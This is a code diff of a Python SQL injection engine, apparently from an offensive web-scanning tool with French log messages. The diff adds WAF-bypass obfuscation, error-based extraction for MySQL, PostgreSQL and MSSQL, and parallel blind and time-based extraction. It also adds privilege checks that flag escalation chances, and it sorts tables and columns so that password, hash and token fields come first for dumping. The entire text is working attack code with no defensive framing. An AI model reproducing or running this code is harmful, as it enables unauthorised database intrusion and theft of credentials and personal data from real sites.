-            nulls = ",".join(["NULL"] * n)
-            resp = self._req_payload(self._wrap(f"UNION SELECT {nulls}"))
-            if resp and not _has_sql_error(resp) and len(resp) > 50:
-                self._cb("found", f"🗄️ UNION NULL×{n}: OK")
-                return n
-            # Also try with ALL
-            resp2 = self._req_payload(self._wrap(f"UNION ALL SELECT {nulls}"))
-            if resp2 and not _has_sql_error(resp2) and len(resp2) > 50:
-                self._cb("found", f"🗄️ UNION ALL NULL×{n}: OK")
-                return n
+            for kw in ["UNION ALL SELECT", "UNION SELECT"]:
+                nulls = ",".join(["NULL"] * n)
+                resp = self._req_payload(self._wrap(f"{kw} {nulls}"))
+                if resp and not _has_sql_error(resp):
+                    self._cb("found", f"🗄️ {kw} NULL×{n}: OK")
+                    return n
         return 0
 
-    def _req_payload(self, payload):
-        """Send request with a prebuilt payload string"""
-        return self._req(payload, param=self.inj_param, method=self.inj_method)
-
     def detect_columns(self):
-        """Auto-detect column count"""
-        self._cb("info", "🗄️ Détection du nombre de colonnes...")
         n = self._detect_cols_orderby()
         if not n:
             n = self._detect_cols_union()
         self.num_cols = n
         if n:
             self._cb("found", f"🗄️ Colonnes: {n}")
-        else:
-            self._cb("warn", "🗄️ Nombre de colonnes inconnu — tentative avec 1..10")
         return n
 
-    # ── Find visible column ───────────────────────────────────────────────────
+    # ── Visible column ────────────────────────────────────────────────────────
     def find_visible_column(self, num_cols=None):
-        """Find which column position is reflected in the output"""
-        n = num_cols or self.num_cols or 8
-        self._cb("info", f"🗄️ Recherche colonne visible ({n} positions)...")
-
-        MARKER_NUM = "98765432100"
-        HEX_MARK   = "0x" + MARK_S.encode().hex()   # "0x533953"
-
+        n = num_cols or self.num_cols or 10
+        self._cb("info", f"🗄️ Recherche colonne visible ({n} cols)...")
         for pos in range(n):
+            # Numeric marker (always visible, never filtered)
             cols = ["NULL"] * n
-            # Try numeric marker first (never sanitized)
-            cols[pos] = MARKER_NUM
-            nulls = ",".join(cols)
-            # Use -1 (no matching row) so only UNION row shows
-            resp = self._req_payload(self._wrap_neg(f"UNION ALL SELECT {nulls}"))
-            if resp and MARKER_NUM in resp:
-                self._cb("found", f"🗄️ Colonne visible: {pos+1}/{n} (num)")
+            cols[pos] = "98765432100"
+            resp = self._req_payload(self._wrap_neg(f"UNION ALL SELECT {','.join(cols)}"))
+            if resp and "98765432100" in resp:
+                self._cb("found", f"🗄️ Colonne visible: position {pos+1}/{n}")
                 self.vis_col = pos
                 return pos
-            # Try string marker
-            cols[pos] = HEX_MARK
-            nulls = ",".join(cols)
-            resp2 = self._req_payload(self._wrap_neg(f"UNION ALL SELECT {nulls}"))
+            # String marker
+            cols[pos] = HEX_MS
+            resp2 = self._req_payload(self._wrap_neg(f"UNION ALL SELECT {','.join(cols)}"))
             if resp2 and MARK_S in resp2:
-                self._cb("found", f"🗄️ Colonne visible: {pos+1}/{n} (str)")
                 self.vis_col = pos
                 return pos
-
-        self._cb("warn", "🗄️ Colonne visible non trouvée — error-based sera utilisé")
+        self._cb("warn", "🗄️ Colonne visible non trouvée — error-based utilisé")
         return -1
 
-    # ── Setup extraction technique ────────────────────────────────────────────
+    # ── Technique setup ───────────────────────────────────────────────────────
     def setup_technique(self):
-        """Determine best extraction technique using the discovered injection context"""
+        """Determine best extraction technique"""
 
-        # Test 1: Error-based (most reliable for MySQL)
-        self._cb("info", "🗄️ Test error-based (EXTRACTVALUE)...")
-        # Use discovered context via _wrap
-        pay_ev = self._wrap("AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT 1),0x7e))")
-        resp   = self._req_payload(pay_ev)
-        val    = _extract_error_value(resp)
-        if val == "1":
-            self._cb("ok", "✅ Error-based EXTRACTVALUE prêt")
+        # ── 1. Error-based (MySQL: EXTRACTVALUE) ─────────────────────────────
+        self._cb("info", "🗄️ Test EXTRACTVALUE...")
+        pay = self._wrap("AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT 1),0x7e))")
+        resp = self._req_payload(pay)
+        if _extract_error_value(resp) == "1":
+            self._cb("ok", "✅ EXTRACTVALUE prêt (MySQL)")
             self.technique = "error"
             self._err_fn   = "EXTRACTVALUE"
             return "error"
 
-        pay_ux = self._wrap("AND UPDATEXML(1,CONCAT(0x7e,(SELECT 1),0x7e),1)")
-        resp2  = self._req_payload(pay_ux)
-        val2   = _extract_error_value(resp2)
-        if val2 == "1":
-            self._cb("ok", "✅ Error-based UPDATEXML prêt")
+        # ── 2. Error-based (MySQL: UPDATEXML) ────────────────────────────────
+        self._cb("info", "🗄️ Test UPDATEXML...")
+        pay2 = self._wrap("AND UPDATEXML(1,CONCAT(0x7e,(SELECT 1),0x7e),1)")
+        resp2 = self._req_payload(pay2)
+        if _extract_error_value(resp2) == "1":
+            self._cb("ok", "✅ UPDATEXML prêt (MySQL)")
             self.technique = "error"
             self._err_fn   = "UPDATEXML"
             return "error"
 
-        # Test 2: UNION-based
+        # ── 3. Error-based WAF bypass variants ───────────────────────────────
+        self._cb("info", "🗄️ Test error-based avec WAF bypass...")
+        for obf in [
+            "AND /*!50000EXTRACTVALUE*/(1,CONCAT(0x7e,(SELECT 1),0x7e))",
+            "AND EXTRACTVALUE(0x0a,CONCAT(0x0a,0x7e,(SELECT/**/1),0x7e))",
+            "AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT 1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
+        ]:
+            resp_obf = self._req_payload(self._wrap(obf))
+            if _extract_error_value(resp_obf) or _has_sql_error(resp_obf):
+                # Try full extraction to confirm
+                pay_test = self._wrap(f"AND EXTRACTVALUE(1,CONCAT(0x7e,({self._sql_version()}),0x7e))")
+                r_test = self._req_payload(pay_test)
+                if _extract_error_value(r_test):
+                    self._cb("ok", "✅ Error-based (WAF bypass) prêt")
+                    self.technique = "error"
+                    self._err_fn   = "EXTRACTVALUE"
+                    return "error"
+
+        # ── 4. Error-based (PostgreSQL: CAST) ────────────────────────────────
+        self._cb("info", "🗄️ Test CAST error (PostgreSQL)...")
+        pay_pg = self._wrap("AND CAST((SELECT version()) AS INT)=1")
+        resp_pg = self._req_payload(pay_pg)
+        if _extract_pg_cast(resp_pg):
+            self._cb("ok", "✅ CAST error-based prêt (PostgreSQL)")
+            self.technique = "pg_error"
+            self.db_type   = "PostgreSQL"
+            return "pg_error"
+
+        # ── 5. Error-based (MSSQL: CONVERT) ──────────────────────────────────
+        self._cb("info", "🗄️ Test CONVERT error (MSSQL)...")
+        pay_ms = self._wrap("AND CONVERT(INT,(SELECT @@version))=1")
+        resp_ms = self._req_payload(pay_ms)
+        if _extract_mssql_convert(resp_ms):
+            self._cb("ok", "✅ CONVERT error-based prêt (MSSQL)")
+            self.technique = "mssql_error"
+            self.db_type   = "MSSQL"
+            return "mssql_error"
+
+        # ── 6. UNION-based ────────────────────────────────────────────────────
         self._cb("info", "🗄️ Test UNION-based...")
         n = self.detect_columns()
         if n:
@@ -528,52 +801,82 @@ class SQLInjector:
                 self.technique = "union"
                 return "union"
 
-        # Test 3: Boolean blind (already confirmed by find_injection)
-        self._cb("info", "🗄️ Activation boolean blind...")
-        true_pay  = self._req_payload(self._wrap("AND 1=1"))
-        false_pay = self._req_payload(self._wrap("AND 1=2"))
-        if true_pay and false_pay and _responses_differ(true_pay, false_pay):
+        # ── 7. Boolean blind ──────────────────────────────────────────────────
+        self._cb("info", "🗄️ Test boolean blind...")
+        tr = self._req_payload(self._wrap("AND 1=1"))
+        fa = self._req_payload(self._wrap("AND 1=2"))
+        if tr and fa and _responses_differ(tr, fa, 0.03):
             self._cb("ok", "✅ Boolean blind prêt")
             self.technique = "blind"
             return "blind"
 
-        # Test 4: Time-based
-        self._cb("info", "🗄️ Test time-based (SLEEP(2))...")
+        # ── 8. Time-based ─────────────────────────────────────────────────────
+        self._cb("info", "🗄️ Test time-based (SLEEP 2s)...")
         t0 = time.time()
         self._req_payload(self._wrap("AND SLEEP(2)"))
-        if time.time() - t0 > 1.8:
-            self._cb("ok", "✅ Time-based blind prêt")
+        if time.time() - t0 >= 1.8:
+            self._cb("ok", "✅ Time-based prêt (MySQL SLEEP)")
             self.technique = "time"
+            return "time"
+
+        # PostgreSQL time-based
+        t0 = time.time()
+        self._req_payload(self._wrap("AND 1=(SELECT 1 FROM pg_sleep(2))"))
+        if time.time() - t0 >= 1.8:
+            self._cb("ok", "✅ Time-based prêt (PostgreSQL pg_sleep)")
+            self.technique = "time"
+            self.db_type   = "PostgreSQL"
+            return "time"
+
+        # MSSQL time-based
+        t0 = time.time()
+        self._req_payload(self._wrap("AND 1=1; WAITFOR DELAY '0:0:2'-- -"))
+        if time.time() - t0 >= 1.8:
+            self._cb("ok", "✅ Time-based prêt (MSSQL WAITFOR)")
+            self.technique = "time"
+            self.db_type   = "MSSQL"
             return "time"
 
         self._cb("warn", "🗄️ Aucune technique d'extraction disponible")
         return None
 
-    # ── Error-based extraction ────────────────────────────────────────────────
+    # ── SQL version query helper ──────────────────────────────────────────────
+    def _sql_version(self):
+        db = self.db_type or "MySQL"
+        if db == "MySQL":       return "SELECT @@version"
+        if db == "PostgreSQL":  return "SELECT version()"
+        if db == "MSSQL":       return "SELECT @@version"
+        if db == "SQLite":      return "SELECT sqlite_version()"
+        if db == "Oracle":      return "SELECT banner FROM v$version WHERE rownum=1"
+        return "SELECT @@version"
+
+    # ── Error-based extraction (MySQL) ────────────────────────────────────────
     def _error_extract(self, sql_expr):
-        """
-        Extract full string via EXTRACTVALUE/UPDATEXML — paginates with SUBSTRING.
-        Tries obfuscated variants when plain payload returns nothing (WAF evasion).
-        """
+        """Extract via EXTRACTVALUE/UPDATEXML with WAF bypass fallback"""
         fn   = getattr(self, "_err_fn", "EXTRACTVALUE")
-        PAGE = 30   # MySQL EXTRACTVALUE max usable chars ~ 31
+        PAGE = 30
 
         result = ""
         offset = 1
         while True:
             chunk_sql = f"SUBSTRING(({sql_expr}),{offset},{PAGE})"
             if fn == "UPDATEXML":
-                inj_plain = f"AND UPDATEXML(1,CONCAT(0x7e,{chunk_sql},0x7e),1)"
+                plain_inj = f"AND UPDATEXML(1,CONCAT(0x7e,{chunk_sql},0x7e),1)"
             else:
-                inj_plain = f"AND EXTRACTVALUE(1,CONCAT(0x7e,{chunk_sql},0x7e))"
+                plain_inj = f"AND EXTRACTVALUE(1,CONCAT(0x7e,{chunk_sql},0x7e))"
 
+            # Try plain, then 4 obfuscation levels
             chunk = None
-
-            # Try plain first, then obfuscated variants if WAF blocks
-            candidates = [inj_plain,
-                          obfuscate_sql(inj_plain, level=1),
-                          obfuscate_sql(inj_plain, level=2),
-                          inject_sql_comments(inj_plain, intensity=0.5)]
+            candidates = [
+                plain_inj,
+                obfuscate_sql(plain_inj, level=1),
+                obfuscate_sql(plain_inj, level=2),
+                inject_sql_comments(plain_inj, intensity=0.4),
+                # MySQL /*!*/ version comment bypass
+                plain_inj.replace("AND ", "/*!AND */").replace(
+                    "EXTRACTVALUE", "/*!50000EXTRACTVALUE*/").replace(
+                    "UPDATEXML", "/*!50000UPDATEXML*/"),
+            ]
             for inj in candidates:
                 resp  = self._req_payload(self._wrap(inj))
                 chunk = _extract_error_value(resp)
@@ -586,40 +889,88 @@ class SQLInjector:
             if len(chunk) < PAGE:
                 break
             offset += PAGE
-            if offset > 2000:
+            if offset > 4000:
                 break
 
         return result if result else None
 
+    # ── PostgreSQL CAST error extraction ─────────────────────────────────────
+    def _pg_error_extract(self, sql_expr):
+        """Extract via PostgreSQL CAST type mismatch errors"""
+        PAGE = 50
+        result = ""
+        offset = 1
+        while True:
+            chunk_sql = f"SUBSTRING(({sql_expr}),{offset},{PAGE})"
+            for inj in [
+                f"AND CAST(({chunk_sql}) AS INT)=1",
+                f"AND 1=CAST(({chunk_sql}) AS NUMERIC)",
+                f"AND CAST(({chunk_sql}) AS INT)>0",
+            ]:
+                resp  = self._req_payload(self._wrap(inj))
+                chunk = _extract_pg_cast(resp)
+                if chunk:
+                    break
+            else:
+                break
+            result += chunk
+            if len(chunk) < PAGE:
+                break
+            offset += PAGE
+            if offset > 4000:
+                break
+        return result if result else None
+
+    # ── MSSQL CONVERT error extraction ───────────────────────────────────────
+    def _mssql_error_extract(self, sql_expr):
+        """Extract via MSSQL CONVERT/CAST errors"""
+        PAGE = 128
+        result = ""
+        offset = 1
+        while True:
+            chunk_sql = f"SUBSTRING(({sql_expr}),{offset},{PAGE})"
+            for inj in [
+                f"AND CONVERT(INT,({chunk_sql}))=1",
+                f"AND CAST(({chunk_sql}) AS INT)=1",
+                f"AND 1=CONVERT(INT,({chunk_sql}))",
+            ]:
+                resp  = self._req_payload(self._wrap(inj))
+                chunk = _extract_mssql_convert(resp)
+                if chunk:
+                    break
+            else:
+                break
+            result += chunk
+            if len(chunk) < PAGE:
+                break
+            offset += PAGE
+            if offset > 4000:
+                break
+        return result if result else None
+
     # ── UNION-based extraction ────────────────────────────────────────────────
     def _union_extract(self, sql_expr):
-        """Extract data via UNION SELECT using discovered context"""
+        """Extract via UNION SELECT — uses discovered col position"""
         if self.vis_col < 0 or self.num_cols == 0:
             return None
-
         cols = ["NULL"] * self.num_cols
         cols[self.vis_col] = f"CONCAT({HEX_MS},({sql_expr}),{HEX_ME})"
         nulls = ",".join(cols)
 
-        resp = self._req_payload(self._wrap_neg(f"UNION ALL SELECT {nulls}"))
-        if resp and MARK_S in resp and MARK_E in resp:
-            m = re.search(re.escape(MARK_S) + r"(.*?)" + re.escape(MARK_E), resp, re.DOTALL)
-            if m:
-                return m.group(1)
-        # Fallback: without -1 suppression
-        resp2 = self._req_payload(self._wrap(f"UNION ALL SELECT {nulls}"))
-        if resp2 and MARK_S in resp2 and MARK_E in resp2:
-            m = re.search(re.escape(MARK_S) + r"(.*?)" + re.escape(MARK_E), resp2, re.DOTALL)
-            if m:
-                return m.group(1)
+        for wrap_fn in [self._wrap_neg, self._wrap]:
+            resp = self._req_payload(wrap_fn(f"UNION ALL SELECT {nulls}"))
+            if resp and MARK_S in resp and MARK_E in resp:
+                m = re.search(re.escape(MARK_S) + r"(.*?)" + re.escape(MARK_E), resp, re.DOTALL)
+                if m:
+                    return m.group(1)
         return None
 
     # ── Boolean blind extraction ──────────────────────────────────────────────
     def _blind_true(self, cond):
-        """Send condition and return True if response matches 'true' baseline"""
+        """Returns True if condition evaluates to TRUE"""
         resp = self._req_payload(self._wrap(f"AND ({cond})"))
         base = self._req_payload(self._wrap("AND 1=1"))
-        return resp and base and not _responses_differ(resp, base, 0.04)
+        return bool(resp and base and not _responses_differ(resp, base, 0.04))
 
     def _blind_len(self, sql_expr, max_len=500):
         """Binary search for string length"""
@@ -633,7 +984,7 @@ class SQLInjector:
         return lo
 
     def _blind_char(self, sql_expr, pos):
-        """Binary search for character at pos (1-based) — FIXED: uses self._ov()"""
+        """Binary search for character at pos (1-indexed)"""
         lo, hi = 32, 126
         while lo < hi:
             mid = (lo + hi) // 2
@@ -644,61 +995,124 @@ class SQLInjector:
         return chr(lo) if 32 <= lo <= 126 else "?"
 
     def _blind_extract(self, sql_expr, max_len=200):
-        """Extract full string via boolean blind binary search — uses _blind_char"""
+        """Full blind extraction — sequential with progress reports"""
         length = self._blind_len(sql_expr, max_len=max_len)
         if not length:
             return None
-        result = ""
         self._cb("info", f"🗄️ Blind extract: {length} chars...")
+        result = ""
         for i in range(1, length + 1):
-            result += self._blind_char(sql_expr, i)
+            c = self._blind_char(sql_expr, i)
+            result += c
+            if i % 8 == 0:
+                self._cb("info", f"🗄️  [{i}/{length}]: {result}")
         return result
 
+    def _blind_extract_fast(self, sql_expr, max_len=200):
+        """Parallel blind extraction — 5 concurrent threads for speed"""
+        length = self._blind_len(sql_expr, max_len=max_len)
+        if not length:
+            return None
+        self._cb("info", f"🗄️ Blind extract rapide (parallel): {length} chars...")
+        result_arr = ["?"] * length
+        lock = threading.Lock()
+
+        def extract_pos(i):
+            c = self._blind_char(sql_expr, i + 1)
+            with lock:
+                result_arr[i] = c
+            return i, c
+
+        with concurrent.futures.ThreadPoolExecutor(max_workers=4) as ex:
+            futures = [ex.submit(extract_pos, i) for i in range(length)]
+            done = 0
+            for f in concurrent.futures.as_completed(futures):
+                f.result()
+                done += 1
+                if done % 10 == 0:
+                    self._cb("info", f"🗄️  [{done}/{length}]: {''.join(result_arr[:done])}")
+
+        return "".join(result_arr)
+
     # ── Time-based extraction ─────────────────────────────────────────────────
-    def _time_extract(self, sql_expr, max_len=100):
-        """Extract via SLEEP-based blind (slow!)"""
+    def _time_extract(self, sql_expr, max_len=50):
+        """Extract via timing-based binary search (slow — last resort)"""
+        self._cb("warn", "🗄️ Time-based: extraction lente (~2s/char)...")
+        ov     = self._ov()
+        suffix = self.inj_suffix or "-- -"
+        quote  = self._quote()
+
+        # Choose sleep function
+        if self.db_type == "PostgreSQL":
+            sleep_fn = lambda n: f"pg_sleep({n})"
+            sleep_cond = lambda expr, pos, mid: (
+                f"1=(SELECT 1 FROM pg_sleep(CASE WHEN "
+                f"ASCII(SUBSTRING(({expr}),{pos},1))>{mid} THEN 2 ELSE 0 END))"
+            )
+        elif self.db_type == "MSSQL":
+            sleep_fn = None
+            def sleep_cond(expr, pos, mid):
+                return f"1=1; IF ASCII(SUBSTRING(({expr}),{pos},1))>{mid} WAITFOR DELAY '0:0:2'-- -"
+        else:  # MySQL
+            def sleep_cond(expr, pos, mid):
+                return f"IF(ASCII(SUBSTRING(({expr}),{pos},1))>{mid},SLEEP(2),0)"
+
         result = ""
-        orig_val = self._qs.get(self.inj_param) or self.post_data.get(self.inj_param) or "1"
         for pos in range(1, max_len + 1):
-            found = False
-            for c in range(33, 127):
-                for quote in ["'", ""]:
-                    for suffix in ["-- -", "#"]:
-                        payload = (f"{orig_val}{quote} AND IF("
-                                   f"ASCII(SUBSTRING(({sql_expr}),{pos},1))={c},"
-                                   f"SLEEP(1),0){suffix}")
-                        t0 = time.time()
-                        self._req(payload)
-                        if time.time() - t0 > 0.9:
-                            result += chr(c)
-                            found = True
-                        break
-                    if found:
-                        break
-                if found:
-                    break
-            if not found:
+            lo, hi = 32, 126
+            while lo < hi:
+                mid = (lo + hi) // 2
+                cond = sleep_cond(sql_expr, pos, mid)
+                payload = f"{ov}{quote} AND {cond}{suffix}"
+                t0 = time.time()
+                self._req_payload(payload)
+                elapsed = time.time() - t0
+                if elapsed >= 1.8:
+                    lo = mid + 1
+                else:
+                    hi = mid
+            if lo < 32 or lo > 126:
                 break
+            result += chr(lo)
+            self._cb("info", f"🗄️  [{pos}]: {result}")
         return result or None
 
     # ── Universal query ───────────────────────────────────────────────────────
     def query(self, sql_expr):
-        """Execute sql_expr using the best available technique"""
-        if self.technique == "error":
-            return self._error_extract(sql_expr)
-        elif self.technique == "union":
-            return self._union_extract(sql_expr)
-        elif self.technique == "blind":
-            return self._blind_extract(sql_expr)
-        elif self.technique == "time":
-            return self._time_extract(sql_expr)
-        return None
+        """Execute sql_expr using best available technique with fallback chain"""
+        tech = self.technique
+        result = None
 
-    # ── High-level data extraction ────────────────────────────────────────────
+        if tech == "error":
+            result = self._error_extract(sql_expr)
+        elif tech == "pg_error":
+            result = self._pg_error_extract(sql_expr)
+        elif tech == "mssql_error":
+            result = self._mssql_error_extract(sql_expr)
+        elif tech == "union":
+            result = self._union_extract(sql_expr)
+        elif tech == "blind":
+            # Try fast parallel first, fallback to sequential
+            result = self._blind_extract_fast(sql_expr)
+            if not result:
+                result = self._blind_extract(sql_expr)
+        elif tech == "time":
+            result = self._time_extract(sql_expr)
+
+        # If primary technique failed, try fallback
+        if not result and tech != "error":
+            result = self._error_extract(sql_expr)
+        if not result and tech not in ("union", "blind"):
+            result = self._union_extract(sql_expr) if self.vis_col >= 0 else None
+        if not result and tech != "blind":
+            result = self._blind_extract(sql_expr)
+
+        return result
+
+    # ── Database info extraction ──────────────────────────────────────────────
     def extract_info(self):
-        """Extract DB version, current database, user, hostname"""
-        self._cb("info", "🗄️ Extraction des infos DB...")
-        info = {}
+        """Extract version, current DB, user, hostname, privileges"""
+        self._cb("info", "🗄️ Extraction des informations DB...")
         queries = {
             "MySQL": {
                 "version":    "SELECT @@version",
@@ -706,16 +1120,22 @@ class SQLInjector:
                 "user":       "SELECT user()",
                 "hostname":   "SELECT @@hostname",
                 "datadir":    "SELECT @@datadir",
+                "privileges": "SELECT GROUP_CONCAT(PRIVILEGE_TYPE SEPARATOR ',') FROM information_schema.USER_PRIVILEGES WHERE GRANTEE=CONCAT(0x27,user(),0x27)",
+                "global_privs": "SELECT GROUP_CONCAT(GRANT_OPTION SEPARATOR ',') FROM information_schema.USER_PRIVILEGES",
             },
             "PostgreSQL": {
                 "version":    "SELECT version()",
                 "current_db": "SELECT current_database()",
                 "user":       "SELECT current_user",
+                "superuser":  "SELECT usesuper FROM pg_user WHERE usename=current_user",
+                "roles":      "SELECT string_agg(rolname,',') FROM pg_roles WHERE pg_has_role(current_user,rolname,'member')",
             },
             "MSSQL": {
                 "version":    "SELECT @@version",
                 "current_db": "SELECT DB_NAME()",
                 "user":       "SELECT SYSTEM_USER",
+                "is_sysadmin":"SELECT IS_SRVROLEMEMBER('sysadmin')",
+                "linked_svrs":"SELECT name FROM master..sysservers WHERE srvid<>0",
             },
             "SQLite": {
                 "version":    "SELECT sqlite_version()",
@@ -724,161 +1144,278 @@ class SQLInjector:
                 "version":    "SELECT banner FROM v$version WHERE rownum=1",
                 "current_db": "SELECT ora_database_name FROM dual",
                 "user":       "SELECT user FROM dual",
+                "privs":      "SELECT LISTAGG(PRIVILEGE,',') WITHIN GROUP (ORDER BY PRIVILEGE) FROM session_privs WHERE rownum<=20",
             },
         }
+        info = {}
         for key, sql in queries.get(self.db_type, queries["MySQL"]).items():
             val = self.query(sql)
             if val:
                 info[key] = val
-                self._cb("found", f"🗄️ {key}: {val[:100]}")
+                self._cb("found", f"🗄️ {key}: {val[:120]}")
+                # Flag privilege escalation opportunities
+                if "FILE" in str(val).upper():
+                    self._cb("vuln", "🚨 Privilège FILE — lecture/écriture de fichiers système possible!")
+                if "SUPER" in str(val).upper() or val.strip() == "1":
+                    self._cb("vuln", "🚨 Privilège SUPER/DBA — accès root base de données!")
         return info
 
+    # ── Database enumeration ──────────────────────────────────────────────────
     def extract_databases(self):
-        """Return list of database names"""
+        """Enumerate all databases"""
         self._cb("info", "🗄️ Énumération des bases de données...")
         sql_map = {
             "MySQL":      "SELECT GROUP_CONCAT(schema_name ORDER BY schema_name SEPARATOR 0x7c7c) FROM information_schema.schemata",
-            "PostgreSQL": "SELECT string_agg(datname,'||') FROM pg_database",
-            "MSSQL":      "SELECT STRING_AGG(name,'||') FROM master..sysdatabases",
-            "SQLite":     None,
+            "PostgreSQL": "SELECT string_agg(datname,'||') FROM pg_database WHERE datistemplate=false",
+            "MSSQL":      "SELECT STUFF((SELECT '||'+name FROM master..sysdatabases FOR XML PATH('')),1,2,'')",
+            "SQLite":     None,  # SQLite is single-file
             "Oracle":     "SELECT LISTAGG(username,'||') WITHIN GROUP (ORDER BY username) FROM all_users",
         }
         sql = sql_map.get(self.db_type)
         if not sql:
+            if self.db_type == "SQLite":
+                self._cb("info", "🗄️ SQLite: base de données unique (fichier)")
+                return ["main"]
             return []
         raw = self.query(sql)
         if not raw:
             return []
         dbs = [d.strip() for d in re.split(r'\|\|', raw) if d.strip()]
-        self._cb("found", f"🗄️ Bases ({len(dbs)}): {', '.join(dbs[:15])}")
+        self._cb("found", f"🗄️ Bases ({len(dbs)}): {', '.join(dbs[:20])}")
         return dbs
 
+    # ── Table enumeration ─────────────────────────────────────────────────────
     def extract_tables(self, database=None):
-        """Return list of table names"""
-        self._cb("info", f"🗄️ Énumération des tables{' de '+database if database else ''}...")
+        """Enumerate tables, sorted by sensitivity"""
+        self._cb("info", f"🗄️ Tables{' de '+database if database else ''}...")
         if self.db_type == "MySQL":
-            if database:
-                hex_db = "0x" + database.encode().hex()
-                sql = (f"SELECT GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR 0x7c7c) "
-                       f"FROM information_schema.tables WHERE table_schema={hex_db}")
-            else:
-                sql = ("SELECT GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR 0x7c7c) "
-                       "FROM information_schema.tables WHERE table_schema=database()")
+            cond = f"table_schema=0x{database.encode().hex()}" if database else "table_schema=database()"
+            sql  = (f"SELECT GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR 0x7c7c) "
+                    f"FROM information_schema.tables WHERE {cond} AND table_type='BASE TABLE'")
         elif self.db_type == "PostgreSQL":
-            sql = "SELECT string_agg(tablename,'||') FROM pg_tables WHERE schemaname='public'"
+            sql = "SELECT string_agg(tablename,'||') FROM pg_tables WHERE schemaname NOT IN ('pg_catalog','information_schema')"
         elif self.db_type == "MSSQL":
-            sql = "SELECT STRING_AGG(name,'||') FROM sysobjects WHERE xtype='U'"
+            sql = "SELECT STUFF((SELECT '||'+name FROM sysobjects WHERE xtype='U' FOR XML PATH('')),1,2,'')"
         elif self.db_type == "SQLite":
-            sql = "SELECT GROUP_CONCAT(name,'||') FROM sqlite_master WHERE type='table'"
+            sql = "SELECT GROUP_CONCAT(name,'||') FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'"
         elif self.db_type == "Oracle":
-            sql = "SELECT LISTAGG(table_name,'||') WITHIN GROUP (ORDER BY table_name) FROM all_tables"
+            sql = "SELECT LISTAGG(table_name,'||') WITHIN GROUP (ORDER BY table_name) FROM all_tables WHERE rownum<=200"
         else:
             sql = ("SELECT GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR 0x7c7c) "
                    "FROM information_schema.tables WHERE table_schema=database()")
+
         raw = self.query(sql)
         if not raw:
             return []
         tables = [t.strip() for t in re.split(r'\|\|', raw) if t.strip()]
-        self._cb("found", f"🗄️ Tables ({len(tables)}): {', '.join(tables[:20])}")
+
+        # Sort: sensitive tables first
+        def sensitivity_score(t):
+            t_lower = t.lower()
+            score = sum(3 for kw in ["pass", "cred", "secret", "auth"] if kw in t_lower)
+            score += sum(2 for kw in ["user", "admin", "account", "member", "login"] if kw in t_lower)
+            score += sum(1 for kw in ["token", "email", "payment", "order"] if kw in t_lower)
+            return -score  # negative for descending sort
+
+        tables.sort(key=sensitivity_score)
+        self._cb("found", f"🗄️ Tables ({len(tables)}): {', '.join(tables[:25])}")
         return tables
 
+    # ── Column enumeration ────────────────────────────────────────────────────
     def extract_columns(self, table, database=None):
-        """Return list of column names for the given table"""
-        self._cb("info", f"🗄️ Colonnes de {table}...")
+        """Enumerate columns for a table"""
+        self._cb("info", f"🗄️ Colonnes de '{table}'...")
         hex_tbl = "0x" + table.encode().hex()
+
         if self.db_type == "MySQL":
-            if database:
-                hex_db = "0x" + database.encode().hex()
-                cond = f"table_name={hex_tbl} AND table_schema={hex_db}"
-            else:
-                cond = f"table_name={hex_tbl} AND table_schema=database()"
-            sql = (f"SELECT GROUP_CONCAT(column_name ORDER BY ordinal_position SEPARATOR 0x7c7c) "
-                   f"FROM information_schema.columns WHERE {cond}")
+            cond = f"table_name={hex_tbl} AND table_schema={'0x'+database.encode().hex() if database else 'database()'}"
+            sql  = f"SELECT GROUP_CONCAT(column_name ORDER BY ordinal_position SEPARATOR 0x7c7c) FROM information_schema.columns WHERE {cond}"
         elif self.db_type == "PostgreSQL":
-            sql = (f"SELECT string_agg(column_name,'||') FROM information_schema.columns "
-                   f"WHERE table_name='{table}'")
+            sql = f"SELECT string_agg(column_name,'||') FROM information_schema.columns WHERE table_name='{table}' AND table_schema='public'"
         elif self.db_type == "MSSQL":
-            sql = f"SELECT STRING_AGG(name,'||') FROM syscolumns WHERE id=OBJECT_ID('{table}')"
+            sql = f"SELECT STUFF((SELECT '||'+name FROM syscolumns WHERE id=OBJECT_ID('{table}') FOR XML PATH('')),1,2,'')"
         elif self.db_type == "SQLite":
             sql = f"SELECT GROUP_CONCAT(name,'||') FROM pragma_table_info('{table}')"
         elif self.db_type == "Oracle":
-            sql = (f"SELECT LISTAGG(column_name,'||') WITHIN GROUP (ORDER BY column_id) "
-                   f"FROM all_tab_columns WHERE table_name=UPPER('{table}')")
+            sql = f"SELECT LISTAGG(column_name,'||') WITHIN GROUP (ORDER BY column_id) FROM all_tab_columns WHERE table_name=UPPER('{table}')"
         else:
-            sql = (f"SELECT GROUP_CONCAT(column_name ORDER BY ordinal_position SEPARATOR 0x7c7c) "
-                   f"FROM information_schema.columns WHERE table_name={hex_tbl}")
+            sql = f"SELECT GROUP_CONCAT(column_name ORDER BY ordinal_position SEPARATOR 0x7c7c) FROM information_schema.columns WHERE table_name={hex_tbl}"
+
         raw = self.query(sql)
         if not raw:
             return []
         cols = [c.strip() for c in re.split(r'\|\|', raw) if c.strip()]
-        self._cb("found", f"🗄️ Colonnes de {table}: {', '.join(cols)}")
+
+        # Sort: sensitive columns first
+        def col_score(c):
+            c_lower = c.lower()
+            score = sum(5 for kw in ["pass", "pwd", "secret", "hash", "salt"] if kw in c_lower)
+            score += sum(3 for kw in ["email", "user", "login", "token", "key"] if kw in c_lower)
+            score += sum(1 for kw in ["name", "id", "date", "status"] if kw in c_lower)
+            return -score
+
+        cols.sort(key=col_score)
+        self._cb("found", f"🗄️ Colonnes de '{table}': {', '.join(cols[:20])}")
         return cols
 
+    # ── Table dump ────────────────────────────────────────────────────────────
     def dump_table(self, table, columns, limit=50):
-        """Dump rows from table. Returns list of dicts."""
-        self._cb("info", f"🗄️ Dump de {table} ({', '.join(columns[:5])})...")
+        """Dump rows from a table with hash detection"""
+        self._cb("info", f"🗄️ Dump '{table}' ({', '.join(columns[:5])})... [limit={limit}]")
         rows = []
+        safe_cols = [c for c in columns if re.match(r'^[a-zA-Z0-9_]+$', c)]
+        if not safe_cols:
+            return rows
 
